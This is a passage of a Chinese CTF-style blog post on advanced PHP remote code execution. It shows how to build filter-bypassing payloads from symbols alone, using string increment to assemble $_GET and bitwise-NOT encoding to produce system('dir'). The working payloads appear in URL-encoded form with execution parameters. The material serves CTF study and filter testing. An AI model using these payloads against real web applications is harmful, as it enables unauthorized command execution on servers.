+</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">=</span><span class="p">[]</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="c1">//Array
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="s1">&#39;&#39;</span><span class="o">==</span><span class="s1">&#39;$&#39;</span><span class="p">];</span><span class="c1">//A
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//B
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//C
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//D
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//E
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span><span class="c1">//E
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//F
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//G
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$___</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span><span class="c1">//G
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//T
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="nv">$___</span><span class="o">.</span><span class="nv">$__</span><span class="o">.</span><span class="nv">$_</span><span class="p">;</span><span class="c1">//GET
+</span></span></span><span class="line"><span class="cl"><span class="c1">//var_dump($_);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$_</span><span class="p">;</span><span class="c1">//_GET
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$$_</span><span class="p">[</span><span class="nx">_</span><span class="p">](</span><span class="nv">$$_</span><span class="p">[</span><span class="nx">__</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//$_GET[_]($_GET[__])
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>随后可以尝试给<code>_</code>和<code>__</code>进行GET传参，我们把换行去掉，然后进行一次URL编码（中间件会解码一次），所以我们构造的payload先变成这样：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$_=[].&#39;&#39;;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=&#39;_&#39;.$_;$$_[_]($$_[__]);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>编码之后</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%24_%3D%5B%5D.&#39;&#39;%3B%24_%3D%24_%5B&#39;&#39;%3D%3D&#39;%24&#39;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D&#39;_&#39;.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后传参<code>&amp;_=system&amp;__=dir;</code>
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709001759231.png" title="image-20230709001759231" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709001759231.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709001759231.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709001759231.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709001759231.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709001759231.png 2x"
+            sizes="auto"
+            alt="image-20230709001759231">
+    </a></figure></p>
+<p>如果是POST传参方式也可以这样：</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709002008799.png" title="image-20230709002008799" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709002008799.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709002008799.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709002008799.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709002008799.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709002008799.png 2x"
+            sizes="auto"
+            alt="image-20230709002008799">
+    </a></figure></p>
+<blockquote>
+<p>在自增中，可以通过特殊字符构造出字符串的有以下几种方式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[].&#39;&#39;  //Array
+</span></span><span class="line"><span class="cl">(0/0).&#39;&#39;   //NAN
+</span></span><span class="line"><span class="cl">(1/0).&#39;&#39;   //INF
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果ban了数字：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a/a	 //NAN
+</span></span><span class="line"><span class="cl">_/_	 //NAN
+</span></span><span class="line"><span class="cl">INF	 //1/a
+</span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<h3 id="取反构造" class="headerLink">
+    <a href="#%e5%8f%96%e5%8f%8d%e6%9e%84%e9%80%a0" class="header-mark"></a>取反构造</h3><p>利用不可见字符，进行两次取反,得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。</p>
+<p>这里的话利用一个php脚本即可获取我们想要的字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ans1</span><span class="o">=</span><span class="s1">&#39;system&#39;</span><span class="p">;</span><span class="c1">//函数名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$ans2</span><span class="o">=</span><span class="s1">&#39;dir&#39;</span><span class="p">;</span><span class="c1">//命令
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$data1</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;~&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$ans1</span><span class="p">));</span><span class="c1">//通过两次取反运算得到system
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$data2</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;~&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$ans2</span><span class="p">));</span><span class="c1">//通过两次取反运算得到dir
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="o">.</span><span class="nv">$data1</span><span class="o">.</span><span class="s1">&#39;)&#39;</span><span class="o">.</span><span class="s1">&#39;(&#39;</span><span class="o">.</span><span class="nv">$data2</span><span class="o">.</span><span class="s1">&#39;)&#39;</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>本地测试</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709004904597.png" title="image-20230709004904597" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709004904597.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709004904597.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709004904597.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709004904597.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709004904597.png 2x"
+            sizes="auto"
+            alt="image-20230709004904597">
+    </a></figure></p>
+<p>然后
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709005351719.png" title="image-20230709005351719" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709005351719.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709005351719.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709005351719.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709005351719.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709005351719.png 2x"
+            sizes="auto"
+            alt="image-20230709005351719">
+    </a></figure></p>
+<p>参考：</p>
+<p><a href="https://www.jianshu.com/p/955bae08f5e1" target="_blank" rel="noopener noreferrer">CTF随笔-RCE进阶</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-17&nbsp;<a class="git-hash" href="https://github.com/HEIGE-PCloud/DoIt/commit/969375dd70cd7acbf2e549364429ffcb642588c5" target="_blank" title="commit by scofield(scofield_1920@outlook.com) 969375dd70cd7acbf2e549364429ffcb642588c5: data" rel="noopener noreferrer">
+                                    <i class="fas fa-hashtag fa-fw"></i>969375d</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/rce_advanced/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\rce_advanced.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\rce_advanced.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20rce_%E8%BF%9B%E9%98%B6&body=|Field|Value|%0A|-|-|%0A|Title|rce_%E8%BF%9B%E9%98%B6|%0A|Url|http://scofield1920.github.io/rce_advanced/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\rce_advanced.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/rce_advanced/" data-title="rce_进阶" data-hashtags="web,manual"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/rce_advanced/" data-hashtag="web"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/rce_advanced/" data-title="rce_进阶"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/rce_advanced/" data-title="rce_进阶"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/rce_advanced/" data-title="rce_进阶"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/rce_advanced/" data-title="rce_进阶" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;rce_进阶&#34;, &#34;http://scofield1920.github.io/rce_advanced/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/manual/">manual</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/reverse-antidbg/" class="prev" rel="prev" title="Reverse-AntiDBG"><i class="fas fa-angle-left fa-fw"></i>Reverse-AntiDBG</a>
+            <a href="/pngcrc/" class="next" rel="next" title="pngCRC">pngCRC<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
